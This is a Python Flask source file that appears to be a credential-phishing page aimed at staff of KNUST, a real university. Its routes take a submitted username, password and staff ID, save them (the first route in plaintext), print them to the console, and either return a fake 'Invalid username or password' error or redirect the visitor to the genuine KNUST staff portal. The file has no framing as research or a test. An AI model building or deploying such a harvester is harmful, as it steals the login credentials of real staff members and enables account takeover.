from flask import render_template,redirect, url_for, request, jsonify
from app.model import User
from app import app, db
import bcrypt


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('UserName')
        password = request.form.get('Password')
        staff_id = request.form.get('StaffId')

        user_obj = User(username=username, password=password, staff_id=staff_id)
        db.session.add(user_obj)
        print(f"Username: {username}, Staff ID: {staff_id}, Password: {password}")

        db.session.commit()
        return jsonify({'message': 'Invalid username or password'}), 401
    return render_template('index.html')

@app.route('/submit', methods=['GET', 'POST'])
def signin():
    if request.method == 'POST':
        username = request.form.get('UserName')
        password = request.form.get('Password')
        staff_id = request.form.get('StaffId')
        

        user_obj = User(username=username, password=hash_pass(password), staff_id=staff_id)
        db.session.add(user_obj)
        db.session.commit()
        print(f"Username: {username}, Staff ID: {staff_id}, Password: {password}")
    return redirect('https://apps.knust.edu.gh/staff'), 200

def hash_pass(password:str) -> str:
    """Hash a password using bcrypt."""
    salt = bcrypt.gensalt()
    hashed_password = bcrypt.hashpw(password.encode(), salt)
    return hashed_password.decode()

if __name__ == '__main__':
    app.run(debug=True)
